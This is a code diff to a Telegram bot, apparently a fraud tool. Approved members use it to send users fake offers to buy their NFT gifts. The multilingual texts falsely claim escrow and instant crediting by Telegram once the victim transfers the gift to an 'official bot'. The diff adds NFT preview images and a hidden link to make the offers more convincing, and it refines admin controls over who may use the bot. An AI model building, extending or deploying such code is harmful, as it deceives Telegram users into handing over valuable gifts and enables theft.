@@ -99,86 +99,60 @@ async def keep_alive():
             pass
         await asyncio.sleep(600)
 
+# --- ФУНКЦИЯ ПОЛУЧЕНИЯ КАРТИНКИ ---
+async def get_nft_image(nft_link):
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getWebPagePreview"
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url, params={"url": nft_link}) as resp:
+                data = await resp.json()
+                if data.get("ok") and "photo" in data.get("result", {}):
+                    return data["result"]["photo"][-1]["file_id"]
+    except Exception:
+        pass
+    return None
+
 # --- ТЕКСТЫ ---
 TEXTS = {
     "ru": {
-        "offer": "Пользователь {user_link}\nпредлагает вам {price} за подарок\n\"{nft_name}\".\n\nПредложение действует еще 24h 00m.\n\n<a href='{nft_link}'>​</a>",
-        "btn_show": "ПОКАЗАТЬ ПОДАРОК",
+        "offer": "Пользователь {user_link}\nпредлагает вам {price} за подарок\n\"{nft_name}\".\n\nПредложение действует еще 24h 00m.",
         "btn_decline": "Отклонить",
         "btn_accept": "Принять",
         "accepted": "<b>Покупатель зарезервировал ваш подарок.</b>\n\n<blockquote>Средства хранятся на специальном эскроу-счете и будут зачислены на баланс после передачи подарка.\n\n<b>Для завершения сделки:</b>\n1. Передайте подарок официальному боту: {transfer_bot}\n2. Нажмите «Передать NFT» и выберите NFT.\n3. Подтвердите передачу подарка.\n\nTelegram зафиксирует транзакцию и моментально зачислит {price} на ваш аккаунт.\n\n<b>Резерв действует 24 часа.</b></blockquote>",
         "btn_transfer": "Передать NFT",
-        "menu": "👋 <b>Главное меню</b>\n\nДобро пожаловать! Выберите действие:\n\n📖 <code>/tutor</code> — Инструкция по использованию\n📝 <code>/price</code> — Создать офер",
+        "menu": "👋 <b>Главное меню</b>\n\nДобро пожаловать! Выберите действие:\n\n📖 <code>/tutor</code> — Инструкция по использованию",
         "tutor": (
             "📖 <b>Инструкция по использованию</b>\n\n"
             "Чтобы создать офер, отправьте команду в формате:\n"
             "<code>/price [ссылка_на_NFT] [цена] [валюта]</code>\n\n"
-            "<b>Примеры:</b>\n"
-            "<code>/price https://t.me/nft/GingerCookie-45925 7 gram</code>\n"
-            "<code>/price https://t.me/nft/TamaGadget-31765 100 stars</code>\n\n"
+            "<b>Пример:</b>\n"
+            "<code>/price https://t.me/nft/GingerCookie-45925 7 gram</code>\n\n"
             "<b>Языки:</b>\n"
             "🇷🇺 <code>/price</code> — Русский\n"
             "🇬🇧 <code>/prace</code> — Английский\n"
             "🇨🇳 <code>/proce</code> — Китайский\n\n"
             "<b>Валюты:</b>\n"
             "💎 <code>gram</code> — TON / GRAM\n"
-            "⭐ <code>stars</code> — Telegram Stars\n\n"
-            "После ввода команды бот пришлет готовую карточку с кнопками «Принять» и «Отклонить»."
+            "⭐ <code>stars</code> — Telegram Stars"
         )
     },
     "en": {
-        "offer": "User {user_link}\noffers you {price} for the gift\n\"{nft_name}\".\n\nOffer valid for another 24h 00m.\n\n<a href='{nft_link}'>​</a>",
-        "btn_show": "SHOW GIFT",
+        "offer": "User {user_link}\noffers you {price} for the gift\n\"{nft_name}\".\n\nOffer valid for another 24h 00m.",
         "btn_decline": "Decline",
         "btn_accept": "Accept",
         "accepted": "<b>The buyer has reserved your gift.</b>\n\n<blockquote>Funds are held in a special escrow account and will be credited to the balance after the gift is transferred.\n\n<b>To complete the deal:</b>\n1. Transfer the gift to the official bot: {transfer_bot}\n2. Click 'Transfer NFT' and select the NFT.\n3. Confirm the transfer of the gift.\n\nTelegram will record the transaction and instantly credit {price} to your account.\n\n<b>The reservation is valid for 24 hours.</b></blockquote>",
-        "btn_transfer": "Transfer NFT",
-        "menu": "👋 <b>Main Menu</b>\n\nWelcome! Choose an action:\n\n📖 <code>/tutor</code> — User Guide\n📝 <code>/price</code> — Create Offer",
-        "tutor": (
-            "📖 <b>User Guide</b>\n\n"
-            "To create an offer, send the command:\n"
-            "<code>/price [NFT_link] [price] [currency]</code>\n\n"
-            "<b>Examples:</b>\n"
-            "<code>/price https://t.me/nft/GingerCookie-45925 7 gram</code>\n"
-            "<code>/price https://t.me/nft/TamaGadget-31765 100 stars</code>\n\n"
-            "<b>Languages:</b>\n"
-            "🇷🇺 <code>/price</code> — Russian\n"
-            "🇬🇧 <code>/prace</code> — English\n"
-            "🇨🇳 <code>/proce</code> — Chinese\n\n"
-            "<b>Currencies:</b>\n"
-            "💎 <code>gram</code> — TON / GRAM\n"
-            "⭐ <code>stars</code> — Telegram Stars\n\n"
-            "After sending the command, the bot will send a ready card with 'Accept' and 'Decline' buttons."
-        )
+        "btn_transfer": "Transfer NFT"
     },
     "zh": {
-        "offer": "用户 {user_link}\n向您提供 {price} 购买礼物\n\"{nft_name}\"。\n\n报价有效期为 24小时 00分钟。\n\n<a href='{nft_link}'>​</a>",
-        "btn_show": "显示礼物",
+        "offer": "用户 {user_link}\n向您提供 {price} 购买礼物\n\"{nft_name}\"。\n\n报价有效期为 24小时 00分钟。",
         "btn_decline": "拒绝",
         "btn_accept": "接受",
         "accepted": "<b>买家已预订您的礼物。</b>\n\n<blockquote>资金存放在特殊的托管账户中，将在礼物转移后记入余额。\n\n<b>完成交易：</b>\n1. 将礼物转移给官方机器人：{transfer_bot}\n2. 点击“转移 NFT”并选择 NFT。\n3. 确认礼物转移。\n\nTelegram 将记录交易并立即将 {price} 记入您的账户。\n\n<b>预订有效期为 24 小时。</b></blockquote>",
-        "btn_transfer": "转移 NFT",
-        "menu": "👋 <b>主菜单</b>\n\n欢迎！请选择操作：\n\n📖 <code>/tutor</code> — 使用说明\n📝 <code>/price</code> — 创建报价",
-        "tutor": (
-            "📖 <b>使用说明</b>\n\n"
-            "要创建报价，请发送命令：\n"
-            "<code>/price [NFT链接] [价格] [货币]</code>\n\n"
-            "<b>示例：</b>\n"
-            "<code>/price https://t.me/nft/GingerCookie-45925 7 gram</code>\n"
-            "<code>/price https://t.me/nft/TamaGadget-31765 100 stars</code>\n\n"
-            "<b>语言：</b>\n"
-            "🇷🇺 <code>/price</code> — 俄语\n"
-            "🇬🇧 <code>/prace</code> — 英语\n"
-            "🇨🇳 <code>/proce</code> — 中文\n\n"
-            "<b>货币：</b>\n"
-            "💎 <code>gram</code> — TON / GRAM\n"
-            "⭐ <code>stars</code> — Telegram Stars\n\n"
-            "发送命令后，机器人将发送带有“接受”和“拒绝”按钮的卡片。"
-        )
+        "btn_transfer": "转移 NFT"
     }
 }
 
-# --- ЛОГИКА БОТА ---
+# --- СОЗДАНИЕ ОФЕРА ---
 async def create_offer(chat_id, user_id, user_full_name, command_text, business_connection_id=None):
     command = command_text.split()[0].lower()
     lang = "ru" if command == "/price" else ("en" if command == "/prace" else "zh")
@@ -195,27 +169,45 @@ async def create_offer(chat_id, user_id, user_full_name, command_text, business_
     nft_name_formatted = nft_link.split('/')[-1].replace('-', '').capitalize()
     user_link = f"<a href='tg://user?id={user_id}'>{user_full_name}</a>"
 
-    final_text = t["offer"].format(user_link=user_link, price=price_text, nft_name=nft_name_formatted, nft_link=nft_link)
+    final_text = t["offer"].format(user_link=user_link, price=price_text, nft_name=nft_name_formatted)
 
+    # Только две кнопки: Отклонить и Принять
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=t["btn_show"], url=nft_link)],
         [
             InlineKeyboardButton(text=t["btn_decline"], callback_data=f"decline:{lang}"),
             InlineKeyboardButton(text=t["btn_accept"], callback_data=f"accept:{price_text}:{lang}")
         ]
     ])
 
+    photo_id = await get_nft_image(nft_link)
+
+    if photo_id:
+        try:
+            # Пытаемся отправить фото и сделать его кликабельным (через скрытую ссылку в caption)
+            await bot.send_photo(
+                chat_id=chat_id,
+                photo=photo_id,
+                caption=final_text + f"\n\n<a href='{nft_link}'>​</a>",
+                business_connection_id=business_connection_id,
+                reply_markup=keyboard
+            )
+            return
+        except Exception as e:
+            logging.error(f"Ошибка отправки фото: {e}")
+
+    # Если фото не удалось получить, отправляем просто текст
     try:
         await bot.send_message(
             chat_id=chat_id,
-            text=final_text,
+            text=final_text + f"\n\n<a href='{nft_link}'>​</a>",
             business_connection_id=business_connection_id,
             reply_markup=keyboard,
             disable_web_page_preview=False
         )
     except Exception as e:
-        logging.error(f"Ошибка при отправке: {e}")
+        logging.error(f"Ошибка при отправке текста: {e}")
 
+# --- КОМАНДЫ ---
 @dp.message(F.text == "/start")
 async def start_command(message: types.Message):
     user_id = message.from_user.id
@@ -226,10 +218,12 @@ async def start_command(message: types.Message):
         await message.answer("👑 Вы админ. Используйте /adminpanel для управления.")
         return
     elif role == "user":
+        # Для одобренных юзеров показываем меню
         t = TEXTS["ru"]
         await message.answer(t["menu"])
         return
 
+    # Для неодобренных (или новых) шлем заявку
     admin_text = (
         f"🔔 <b>Новая заявка на доступ!</b>\n\n"
         f"👤 Имя: {message.from_user.full_name}\n"
@@ -239,7 +233,7 @@ async def start_command(message: types.Message):
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="✅ Принять", callback_data=f"approve:{user_id}"),
+            InlineKeyboardButton(text="✅ Принять", callback_data=f"approve:{user_id}:{username}"),
             InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject:{user_id}")
         ]
     ])
@@ -254,38 +248,32 @@ async def tutor_command(message: types.Message):
     if get_user_role(message.from_user.id) not in ["admin", "user"]: return
     await message.answer(TEXTS["ru"]["tutor"])
 
+# --- АДМИН-ПАНЕЛЬ ---
 @dp.message(F.text == "/adminpanel")
 async def admin_panel(message: types.Message):
     if get_user_role(message.from_user.id) != "admin": return
-
     text = (
         "👑 <b>Админ-панель</b>\n\n"
-        "Доступные команды:\n"
         "📋 <code>/list_users</code> — Список всех участников\n"
-        "➕ <code>/add_admin [ID|@username]</code> — Назначить админом\n"
-        "➕ <code>/add_user [ID|@username]</code> — Добавить пользователя\n"
-        "❌ <code>/del [ID|@username]</code> — Удалить пользователя\n"
+        "➕ <code>/add_admin [ID|@user]</code> — Назначить админом\n"
+        "➕ <code>/add_user [ID|@user]</code> — Добавить пользователя\n"
+        "❌ <code>/del [ID|@user]</code> — Удалить пользователя\n"
         "📥 <code>/download_db</code> — Скачать файл базы\n"
     )
-    
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📥 Скачать базу (users.db)", callback_data="download_db")]
+        [InlineKeyboardButton(text="📥 Скачать базу", callback_data="download_db")]
     ])
-    
     await message.answer(text, reply_markup=keyboard)
 
 @dp.message(F.text == "/list_users")
 async def list_users(message: types.Message):
     if get_user_role(message.from_user.id) != "admin": return
     users = get_all_users()
-    if not users:
-        return
-
-    text = "👥 <b>Список участников:</b>\n\n"
+    if not users: return
+    text = "👥 <b>Список:</b>\n\n"
     for u_id, username, role in users:
         icon = "👑" if role == "admin" else "👤"
-        text += f"{icon} <code>{u_id}</code> | {username} — {role}\n"
-    
+        text += f"{icon} <code>{u_id}</code> | {username}\n"
     await message.answer(text)
 
 @dp.message(F.text.startswith("/add_admin"))
@@ -294,18 +282,13 @@ async def add_admin_cmd(message: types.Message):
     try:
         target = message.text.split()[1]
         target_id = get_user_id(target)
-        
         if target_id:
             add_user(target_id, target, "admin")
-            await message.answer(f"👑 Пользователь {target} назначен админом.")
-            try:
-                await bot.send_message(target_id, "👑 Вам выданы права администратора в боте.")
-            except:
-                pass
+            await message.answer(f"👑 {target} назначен админом.")
         else:
-            await message.answer("❌ Пользователь не найден в базе. Он должен сначала написать /start.")
+            await message.answer("❌ Не найден. Пусть напишет /start.")
     except:
-        await message.answer("❌ Формат: /add_admin 123456789 или /add_admin @username")
+        await message.answer("❌ Формат: /add_admin 1234 или /add_admin @user")
 
 @dp.message(F.text.startswith("/add_user"))
 async def add_user_cmd(message: types.Message):
@@ -313,45 +296,34 @@ async def add_user_cmd(message: types.Message):
     try:
         target = message.text.split()[1]
         target_id = get_user_id(target)
-        
         if target_id:
             add_user(target_id, target, "user")
-            await message.answer(f"✅ Пользователь {target} добавлен.")
-            try:
-                await bot.send_message(target_id, "🎉 Вам выдан доступ к боту!")
-            except:
-                pass
+            await message.answer(f"✅ {target} добавлен.")
         else:
-            await message.answer("❌ Пользователь не найден в базе. Он должен сначала написать /start.")
+            await message.answer("❌ Не найден. Пусть напишет /start.")
     except:
-        await message.answer("❌ Формат: /add_user 123456789 или /add_user @username")
+        await message.answer("❌ Формат: /add_user 1234 или /add_user @user")
 
 @dp.message(F.text.startswith("/del"))
 async def del_user_cmd(message: types.Message):
     if get_user_role(message.from_user.id) != "admin": return
-    
     args = message.text.split()
-    if len(args) < 2:
-        await message.answer("❌ Формат: /del 123456789 или /del @username")
-        return
-        
+    if len(args) < 2: return
     target = args[1]
-    
     if target == str(MAIN_ADMIN_ID):
         await message.answer("❌ Нельзя удалить главного админа.")
         return
-        
     if del_user(target):
-        await message.answer(f"✅ Пользователь {target} удален из базы.")
+        await message.answer(f"✅ {target} удален.")
     else:
-        await message.answer("❌ Пользователь не найден.")
+        await message.answer("❌ Не найден.")
 
 @dp.message(F.text == "/download_db")
 async def download_db_cmd(message: types.Message):
     if get_user_role(message.from_user.id) != "admin": return
     try:
         file = FSInputFile("users.db")
-        await message.answer_document(file, caption="📦 Файл базы данных")
+        await message.answer_document(file, caption="📦 База данных")
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
 
@@ -360,25 +332,26 @@ async def download_db_callback(callback: types.CallbackQuery):
     if get_user_role(callback.from_user.id) != "admin": return
     try:
         file = FSInputFile("users.db")
-        await callback.message.answer_document(file, caption="📦 Файл базы данных")
+        await callback.message.answer_document(file, caption="📦 База данных")
     except Exception as e:
         await callback.message.answer(f"❌ Ошибка: {e}")
     await callback.answer()
 
+# --- ОБРАБОТКА ЗАЯВОК ---
 @dp.callback_query(F.data.startswith("approve:"))
 async def approve_user(callback: types.CallbackQuery):
     if get_user_role(callback.from_user.id) != "admin": return
-    user_id = int(callback.data.split(":")[1])
     
-    conn = sqlite3.connect('users.db')
-    cursor = conn.cursor()
-    cursor.execute("UPDATE users SET role = 'user' WHERE id = ?", (user_id,))
-    conn.commit()
-    conn.close()
+    parts = callback.data.split(":")
+    user_id = int(parts[1])
+    username = parts[2] if len(parts) > 2 else "нет"
+    
+    # ТЕПЕРЬ СОХРАНЯЕМ ЮЗЕРНЕЙМ, ЧТОБЫ БОТ ЕГО НАШЕЛ ПРИ /start
+    add_user(user_id, username, "user")
     
     await callback.message.edit_text(f"✅ Пользователь <code>{user_id}</code> одобрен.")
     try:
-        await bot.send_message(user_id, "🎉 Ваша заявка одобрена! Теперь вы можете использовать /price.\n\nНапишите /tutor для инструкции.")
+        await bot.send_message(user_id, "🎉 Ваша заявка одобрена!\n\nНапишите /start для открытия меню или /tutor для инструкции.")
     except:
         pass
     await callback.answer()
@@ -390,6 +363,7 @@ async def reject_user(callback: types.CallbackQuery):
     await callback.message.edit_text(f"❌ Пользователь <code>{user_id}</code> отклонен.")
     await callback.answer()
 
+# --- ОФЕРЫ И КНОПКИ ---
 @dp.business_message(F.text.regexp(r"^/(price|prace|proce)\s+"))
 async def handle_business_price(message: types.Message):
     if get_user_role(message.from_user.id) not in ["admin", "user"]: return
@@ -427,10 +401,16 @@ async def accept_offer(callback: types.CallbackQuery):
             [InlineKeyboardButton(text=t["btn_transfer"], url=gift_link)]
         ])
 
-        await bot.edit_message_text(
-            text=new_text, chat_id=callback.message.chat.id, message_id=callback.message.message_id,
-            reply_markup=new_keyboard, business_connection_id=callback.message.business_connection_id
-        )
+        if callback.message.photo:
+            await bot.edit_message_caption(
+                caption=new_text, chat_id=callback.message.chat.id, message_id=callback.message.message_id,
+                reply_markup=new_keyboard, business_connection_id=callback.message.business_connection_id
+            )
+        else:
+            await bot.edit_message_text(
+                text=new_text, chat_id=callback.message.chat.id, message_id=callback.message.message_id,
+                reply_markup=new_keyboard, business_connection_id=callback.message.business_connection_id
+            )
     except Exception as e:
         logging.error(f"Ошибка в кнопке: {e}")
 
